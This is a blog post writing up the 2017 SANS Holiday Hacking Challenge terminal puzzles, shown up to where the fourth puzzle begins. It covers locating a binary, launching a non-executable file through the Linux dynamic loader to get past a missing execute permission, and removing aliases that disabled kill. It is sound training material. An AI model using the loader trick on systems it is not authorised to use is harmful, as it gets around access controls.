<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content=""><meta name="hour-prompt" content=""><meta name="minute-prompt" content=""><meta name="justnow-prompt" content=""><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="2017 SANS Holiday Hacking Challenge" /><meta name="author" content="Duc Phan" /><meta property="og:locale" content="en_US" /><meta name="description" content="This year, I’ve had the chance to participate in SANS Holiday Hacking Challenge. The first time I did it was last year. I didn’t think it was interesting with real pentesting stuffs until I read the writeups, so I decided to start early this year." /><meta property="og:description" content="This year, I’ve had the chance to participate in SANS Holiday Hacking Challenge. The first time I did it was last year. I didn’t think it was interesting with real pentesting stuffs until I read the writeups, so I decided to start early this year." /><link rel="canonical" href="https://ret2.life/posts/SANS-HHC-2017/" /><meta property="og:url" content="https://ret2.life/posts/SANS-HHC-2017/" /><meta property="og:site_name" content="ret2life" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2017-12-16T22:42:59+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="2017 SANS Holiday Hacking Challenge" /><meta name="twitter:site" content="@flyingpassword" /><meta name="twitter:creator" content="@Duc Phan" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Duc Phan"},"dateModified":"2017-12-16T22:42:59+08:00","datePublished":"2017-12-16T22:42:59+08:00","description":"This year, I’ve had the chance to participate in SANS Holiday Hacking Challenge. The first time I did it was last year. I didn’t think it was interesting with real pentesting stuffs until I read the writeups, so I decided to start early this year.","headline":"2017 SANS Holiday Hacking Challenge","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2.life/posts/SANS-HHC-2017/"},"url":"https://ret2.life/posts/SANS-HHC-2017/"}</script><title>2017 SANS Holiday Hacking Challenge | ret2life</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="ret2life"><meta name="application-name" content="ret2life"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang=""><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://pbs.twimg.com/profile_images/1417881771534819331/0AuUptMd_400x400.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">ret2life</a></div><div class="site-subtitle font-italic">From CTF write-ups to everyday life kind of things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span></span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ducphanduyagentp" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/flyingpassword" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['youreallythingimmaputemail','on.here?'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> </a> </span> <span>2017 SANS Holiday Hacking Challenge</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" ></span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>2017 SANS Holiday Hacking Challenge</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Duc Phan </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="2017-12-16 22:42:59 +0800" >2017-12-16 22:42:59 +0800<i class="unloaded">2017-12-16T22:42:59+08:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="5001 ">27 </span></div></div><div class="post-content"> <img data-proofer-ignore data-src="/assets/img/sans-hhc17/ranking.png" class="preview-img" alt="Preview Image" ><p>This year, I’ve had the chance to participate in SANS Holiday Hacking Challenge. The first time I did it was last year. I didn’t think it was interesting with real pentesting stuffs until I read the writeups, so I decided to start early this year.</p><p><a href="#HHC17-Terminal">Terminal Challenges</a></p><p><a href="#HHC17-GreatBook">Finding Great Book Pages</a></p><p><a href="#HHC17-learned">Things I’ve learned</a></p><p><a name="HHC17-Terminal"></a></p><h2 id="terminal-challenges">Terminal Challenges</h2><h3 id="winter-wonder-landing">WINTER WONDER LANDING</h3><h4 id="linux-command-hijacking">Linux command hijacking</h4><p>Click on the terminal, we are presented with the object: to find elftalkd.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>                                 |
                               \ ' /
                             -- (*) --
                                &gt;*&lt;
                               &gt;0&lt;@&lt;
                              &gt;&gt;&gt;@&lt;&lt;*
                             &gt;@&gt;*&lt;0&lt;&lt;&lt;
                            &gt;*&gt;&gt;@&lt;&lt;&lt;@&lt;&lt;
                           &gt;@&gt;&gt;0&lt;&lt;&lt;*&lt;&lt;@&lt;
                          &gt;*&gt;&gt;0&lt;&lt;@&lt;&lt;&lt;@&lt;&lt;&lt;
                         &gt;@&gt;&gt;*&lt;&lt;@&lt;&gt;*&lt;&lt;0&lt;*&lt;
           \*/          &gt;0&gt;&gt;*&lt;&lt;@&lt;&gt;0&gt;&lt;&lt;*&lt;@&lt;&lt;
       ___\\U//___     &gt;*&gt;&gt;@&gt;&lt;0&lt;&lt;*&gt;&gt;@&gt;&lt;*&lt;0&lt;&lt;
       |\\ | | \\|    &gt;@&gt;&gt;0&lt;*&lt;0&gt;&gt;@&lt;&lt;0&lt;&lt;&lt;*&lt;@&lt;&lt;  
       | \\| | _(UU)_ &gt;((*))_&gt;0&gt;&lt;*&lt;0&gt;&lt;@&lt;&lt;&lt;0&lt;*&lt;
       |\ \| || / //||.*.*.*.|&gt;&gt;@&lt;&lt;*&lt;&lt;@&gt;&gt;&lt;0&lt;&lt;&lt;
       |\\_|_|&amp;&amp;_// ||*.*.*.*|_\\db//_               
       """"|'.'.'.|~~|.*.*.*|     ____|_
           |'.'.'.|   ^^^^^^|____|&gt;&gt;&gt;&gt;&gt;&gt;|
           ~~~~~~~~         '""""`------'
My name is Bushy Evergreen, and I have a problem for you.
I think a server got owned, and I can only offer a clue.
We use the system for chat, to keep toy production running.
Can you help us recover from the server connection shunning?
Find and run the elftalkd binary to complete this challenge.
</pre></table></code></div></div><p>Let’s try using find:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>elf@5e210ec83121:/run/elftalk/bin<span class="nv">$ </span>find / <span class="nt">-xdev</span> <span class="nt">-iname</span> <span class="s2">"*elftalkd*"</span>
bash: /usr/local/bin/find: cannot execute binary file: Exec format error

</pre></table></code></div></div><p>No surprise. Let’s use <code class="language-plaintext highlighter-rouge">ls</code> to find this</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>elf@5e210ec83121:/tmp<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-laR</span> / | <span class="nb">grep</span> <span class="nt">-B</span> 10 elftalkd
<span class="nb">ls</span>: cannot open directory <span class="s1">'/proc/tty/driver'</span>: Permission denied
<span class="nb">ls</span>: cannot open directory <span class="s1">'/root'</span>: Permission denied
/run/elftalk:
total 12
drwxr-xr-x 1 root root 4096 Dec  4 14:32 <span class="nb">.</span>
drwxr-xr-x 1 root root 4096 Dec  4 14:32 ..
drwxr-xr-x 1 root root 4096 Dec  4 14:32 bin
/run/elftalk/bin:
total 7224
drwxr-xr-x 1 root root    4096 Dec  4 14:32 <span class="nb">.</span>
drwxr-xr-x 1 root root    4096 Dec  4 14:32 ..
<span class="nt">-rwxr-xr-x</span> 1 root root 7385168 Dec  4 14:29 elftalkd
<span class="nb">ls</span>: cannot open directory <span class="s1">'/var/cache/apt/archives/partial'</span>: Permission denied
<span class="nb">ls</span>: cannot open directory <span class="s1">'/var/cache/ldconfig'</span>: Permission denied
<span class="nb">ls</span>: cannot open directory <span class="s1">'/var/lib/apt/lists/partial'</span>: Permission denied
</pre></table></code></div></div><p>There we go. The binary is in <code class="language-plaintext highlighter-rouge">/run/elftalk/bin</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>elf@466dc314ba46:~<span class="nv">$ </span>/run/elftalk/bin/elftalkd 
        Running <span class="k">in </span>interactive mode
        <span class="nt">--</span><span class="o">==</span> Initializing elftalkd <span class="o">==</span><span class="nt">--</span>
Initializing Messaging System!
Nice-O-Meter configured to 0.90 sensitivity.
Acquiring messages from <span class="nb">local </span>networks...
<span class="nt">--</span><span class="o">==</span> Initialization Complete <span class="o">==</span><span class="nt">--</span>
      _  __ _        _ _       _ 
     | |/ _| |      | | |     | |
  ___| | |_| |_ __ _| | | ____| |
 / _ <span class="se">\ </span>|  _| __/ _<span class="sb">`</span> | | |/ / _<span class="sb">`</span> |
|  __/ | | | <span class="o">||</span> <span class="o">(</span>_| | |   &lt; <span class="o">(</span>_| |
 <span class="se">\_</span>__|_|_|  <span class="se">\_</span>_<span class="se">\_</span>_,_|_|_|<span class="se">\_\_</span>_,_|
-<span class="k">*</span><span class="o">&gt;</span> elftalkd! &lt;<span class="k">*</span>-
Version 9000.1 <span class="o">(</span>Build 31337<span class="o">)</span> 
By Santa Claus &amp; The Elf Team
Copyright <span class="o">(</span>C<span class="o">)</span> 2017 NotActuallyCopyrighted. No actual rights reserved.
Using libc6 version 2.23-0ubuntu9
<span class="nv">LANG</span><span class="o">=</span>en_US.UTF-8
<span class="nv">Timezone</span><span class="o">=</span>UTC
Commencing Elf Talk Daemon <span class="o">(</span><span class="nv">pid</span><span class="o">=</span>6021<span class="o">)</span>... <span class="k">done</span><span class="o">!</span>
Background daemon...
</pre></table></code></div></div><h3 id="cryokinetic-magic">CRYOKINETIC MAGIC</h3><h4 id="candy-cane-striper">Candy Cane Striper</h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>                     ___
                    / __<span class="s1">'.     .-"""-.
              .-""-| |  '</span>.<span class="s1">'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'</span>._
           <span class="p">;</span> <span class="p">;</span>      <span class="sb">`</span>.-<span class="s2">" "</span>-:_,<span class="o">(</span>o:<span class="o">==</span>..<span class="sb">`</span>-. <span class="s1">'.         .-"-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'</span>      <span class="se">\ </span> <span class="s1">'.`---'</span> /
     <span class="se">\ \ </span>  / /     |<span class="sb">`</span>        <span class="se">\'</span>   _...--.<span class="p">;</span>   <span class="s1">'---'</span><span class="sb">`</span>
      <span class="se">\ </span><span class="s1">'-'</span> / jgs  /_..---.._ <span class="se">\ </span>.<span class="s1">'\\_     `.
       `--'</span><span class="sb">`</span>      .<span class="s1">'    (_)  `'</span>/   <span class="o">(</span>_<span class="o">)</span>     /
                  <span class="sb">`</span>._       _.<span class="s1">'|         .'</span>
                     <span class="sb">```````</span>    <span class="s1">'-...--'</span><span class="sb">`</span>
My name is Holly Evergreen, and I have a conundrum.
I broke the candy cane striper, and I<span class="s1">'m near throwing a tantrum.
Assembly lines have stopped since the elves can'</span>t get their candy cane fix.
We hope you can start the striper once again, with your vast bag of tricks.
Run the CandyCaneStriper executable to <span class="nb">complete </span>this challenge.
</pre></table></code></div></div><p>This time we are prompted to run a binary. It has no <code class="language-plaintext highlighter-rouge">execute</code> permission and we cannot set this permission for the binary as well.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>elf@b83c138c0b53:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 68
drwxr-xr-x 1 elf  elf   4096 Dec 15 20:00 <span class="nb">.</span>
drwxr-xr-x 1 root root  4096 Dec  5 19:31 ..
<span class="nt">-rw-r--r--</span> 1 elf  elf    220 Aug 31  2015 .bash_logout
<span class="nt">-rw-r--r--</span> 1 root root  3143 Dec 15 19:59 .bashrc
<span class="nt">-rw-r--r--</span> 1 elf  elf    655 May 16  2017 .profile
<span class="nt">-rw-r--r--</span> 1 root root 45224 Dec 15 19:59 CandyCaneStriper
elf@b83c138c0b53:~<span class="nv">$ </span><span class="nb">chmod</span> +x CandyCaneStriper 
elf@b83c138c0b53:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 68
drwxr-xr-x 1 elf  elf   4096 Dec 15 20:00 <span class="nb">.</span>
drwxr-xr-x 1 root root  4096 Dec  5 19:31 ..
<span class="nt">-rw-r--r--</span> 1 elf  elf    220 Aug 31  2015 .bash_logout
<span class="nt">-rw-r--r--</span> 1 root root  3143 Dec 15 19:59 .bashrc
<span class="nt">-rw-r--r--</span> 1 elf  elf    655 May 16  2017 .profile
<span class="nt">-rw-r--r--</span> 1 root root 45224 Dec 15 19:59 CandyCaneStriper
</pre></table></code></div></div><p>Refer to the tweet from Holly the Elf, I found a hint to the solution: <code class="language-plaintext highlighter-rouge">https://twitter.com/GreenesterElf/status/938542480487677952</code> This is a 64-bit machine, so we need to find the linker at <code class="language-plaintext highlighter-rouge">/lib64/ld-linux-x86-64.so.2</code>. Let’s try this out:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>elf@b83c138c0b53:~<span class="nv">$ </span>/lib64/ld-linux-x86-64.so.2 /home/elf/CandyCaneStriper 
                   _..._
                 .<span class="s1">'\\ //`,      
                /\\.'</span><span class="sb">``</span><span class="s1">'.=",
               / \/     ;==|
              /\\/    .'</span><span class="se">\`</span>,<span class="sb">`</span>
             / <span class="se">\/</span>     <span class="sb">`</span><span class="s2">""</span><span class="sb">`</span>
            /<span class="se">\\</span>/
           /<span class="se">\\</span>/
          /<span class="se">\ </span>/
         /<span class="se">\\</span>/
        /<span class="sb">`</span><span class="se">\/</span>
        <span class="se">\\</span>/
         <span class="sb">`</span>
The candy cane striping machine is up and running!
</pre></table></code></div></div><h3 id="winconceivable-the-cliffs-of-winsanity">WINCONCEIVABLE: THE CLIFFS OF WINSANITY</h3><h4 id="the-troublesome-process-termination">The troublesome process termination</h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>                ___,@
               /  &lt;
          ,_  /    <span class="se">\ </span> _,
      ?    <span class="se">\`</span>/______<span class="se">\`</span>/
   ,_<span class="o">(</span>_<span class="o">)</span><span class="nb">.</span>  |<span class="p">;</span> <span class="o">(</span>e  e<span class="o">)</span> <span class="p">;</span>|
    <span class="se">\_</span>__ <span class="se">\ \/\ </span>  7  /<span class="se">\/</span>    _<span class="se">\8</span>/_
        <span class="se">\/\ </span>  <span class="se">\'</span><span class="o">==</span><span class="s1">'/      | /| /|
         \ \___)--(_______|//|//|
          \___  ()  _____/|/_|/_|
             /  ()  \    `----'</span>
            /   <span class="o">()</span>   <span class="se">\</span>
           <span class="s1">'-.______.-'</span>
   jgs   _    |_||_|    _
        <span class="o">(</span>@____<span class="o">)</span> <span class="o">||</span> <span class="o">(</span>____@<span class="o">)</span>
         <span class="se">\_</span>_____||______/
My name is Sparkle Redberry, and I need your help.
My server is atwist, and I fear I may yelp.
Help me <span class="nb">kill </span>the troublesome process gone awry.
I will <span class="k">return </span>the favor with a gift before nigh.
</pre></table></code></div></div><p>Let’s examine the running processes</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>elf@f22c16457eec:~<span class="nv">$ </span>ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
elf          1  0.0  0.0  18028  2764 pts/0    Ss   06:31   0:00 /bin/bash /sbin/init
elf          8  0.0  0.0   4224   740 pts/0    S    06:32   0:00 /usr/bin/santaslittlehelperd
elf         11  0.1  0.0  13528  6404 pts/0    S    06:32   0:00 /sbin/kworker
elf         12  0.0  0.0  18248  3168 pts/0    S    06:32   0:00 /bin/bash
elf         18  0.7  0.0  71468 26544 pts/0    S    06:32   0:00 /sbin/kworker
elf         74  0.0  0.0  34424  2860 pts/0    R+   06:32   0:00 ps aux
</pre></table></code></div></div><p>I then tried to kill the process using the <code class="language-plaintext highlighter-rouge">kill</code> command. I did used the wrong syntax but no error popped out and the process wasn’t killed either.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>elf@f22c16457eec:~<span class="nv">$ </span><span class="nb">kill</span> <span class="nt">-9</span> pidof santaslittlehelperd
elf@f22c16457eec:~<span class="nv">$ </span>ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
elf          1  0.0  0.0  18028  2764 pts/0    Ss   06:31   0:00 /bin/bash /sbin/init
elf          8  0.0  0.0   4224   740 pts/0    S    06:32   0:00 /usr/bin/santaslittlehelperd
elf         11  0.1  0.0  13528  6404 pts/0    S    06:32   0:00 /sbin/kworker
elf         12  0.0  0.0  18248  3288 pts/0    S    06:32   0:00 /bin/bash
elf         18  0.5  0.0  71468 26544 pts/0    S    06:32   0:00 /sbin/kworker
elf        100  0.0  0.0  34424  2800 pts/0    R+   06:33   0:00 ps aux
</pre></table></code></div></div><p>I then referred to the hint on Sparkle tweet: <code class="language-plaintext highlighter-rouge">alias</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>elf@f22c16457eec:~<span class="nv">$ </span><span class="nb">alias
alias </span><span class="nv">alert</span><span class="o">=</span><span class="s1">'notify-send --urgency=low -i "$([ $? = 0 ] &amp;&amp; echo terminal || echo error)" "$(history|tail -n1|sed -e '</span><span class="se">\'</span><span class="s1">'s/^\s*[0-9]\+\s*//;s/[;&amp;|]\s*ale
rt$//'</span><span class="se">\'</span><span class="s1">')"'</span>
<span class="nb">alias </span><span class="nv">egrep</span><span class="o">=</span><span class="s1">'egrep --color=auto'</span>
<span class="nb">alias </span><span class="nv">fgrep</span><span class="o">=</span><span class="s1">'fgrep --color=auto'</span>
<span class="nb">alias grep</span><span class="o">=</span><span class="s1">'grep --color=auto'</span>
<span class="nb">alias kill</span><span class="o">=</span><span class="s1">'true'</span>
<span class="nb">alias </span><span class="nv">killall</span><span class="o">=</span><span class="s1">'true'</span>
<span class="nb">alias </span><span class="nv">l</span><span class="o">=</span><span class="s1">'ls -CF'</span>
<span class="nb">alias </span><span class="nv">la</span><span class="o">=</span><span class="s1">'ls -A'</span>
<span class="nb">alias </span><span class="nv">ll</span><span class="o">=</span><span class="s1">'ls -alF'</span>
<span class="nb">alias ls</span><span class="o">=</span><span class="s1">'ls --color=auto'</span>
<span class="nb">alias </span><span class="nv">pkill</span><span class="o">=</span><span class="s1">'true'</span>
<span class="nb">alias </span><span class="nv">skill</span><span class="o">=</span><span class="s1">'true'</span>
</pre></table></code></div></div><p>So there was an alias of kill, making the command useless. I just needed to unalias these and kill the process easily</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>elf@f22c16457eec:~<span class="nv">$ </span><span class="nb">unalias</span> <span class="nt">-a</span>
elf@f22c16457eec:~<span class="nv">$ </span><span class="nb">alias
</span>elf@f22c16457eec:~<span class="nv">$ </span><span class="nb">kill</span> <span class="nt">-9</span> <span class="sb">`</span>pidof santaslittlehelperd<span class="sb">`</span>
elf@f22c16457eec:~<span class="nv">$ </span>ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
elf          1  0.0  0.0  18028  2764 pts/0    Ss   06:31   0:00 /bin/bash /sbin/init
elf         12  0.0  0.0  18248  3288 pts/0    S    06:32   0:00 /bin/bash
elf        192  0.0  0.0  34424  2912 pts/0    R+   06:34   0:00 ps aux
</pre></table></code></div></div><h3 id="theres-snow-place-like-home">THERE’S SNOW PLACE LIKE HOME</h3><h4 id="train-startup">Train Startup</h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>                             ______
                          .-<span class="s2">""""</span>.._<span class="s1">'.       _,##
                   _..__ |.-"""-.|  |   _,##'</span><span class="sb">`</span>-._
                  <span class="o">(</span>_____<span class="o">)||</span>_____||  |_,##<span class="s1">'`-._,##'</span><span class="sb">`</span>
                  _|   |.<span class="p">;</span>-<span class="s2">""</span>-.  |  |#<span class="s1">'`-._,##'</span><span class="sb">`</span>
